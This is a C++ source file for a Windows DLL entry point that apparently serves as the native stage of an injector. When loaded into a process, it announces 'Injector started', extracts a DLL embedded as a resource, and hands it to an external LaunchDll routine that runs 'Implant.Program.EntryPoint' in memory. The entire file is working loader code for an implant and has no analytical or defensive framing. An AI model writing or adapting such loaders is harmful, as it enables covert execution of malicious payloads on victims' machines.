// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>
#include <iostream>
#include "resource.h"

extern void LaunchDll(
    unsigned char* dll, size_t dllLength,
    char const* className, char const* methodName);

static DWORD WINAPI launcher(void* h)
{
    HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
        MAKEINTRESOURCEA(IDR_DLLENCLOSED), "DLL");
    if (res)
    {
        HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
        if (dat)
        {
            unsigned char* dll =
                static_cast<unsigned char*>(::LockResource(dat));
            if (dll)
            {
                size_t len = SizeofResource(static_cast<HMODULE>(h), res);
                LaunchDll(dll, len, "Implant.Program", "EntryPoint");
            }
        }
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        std::cout << "Injector started (native)" << std::endl;
        CreateThread(0, 0, launcher, hModule, 0, 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

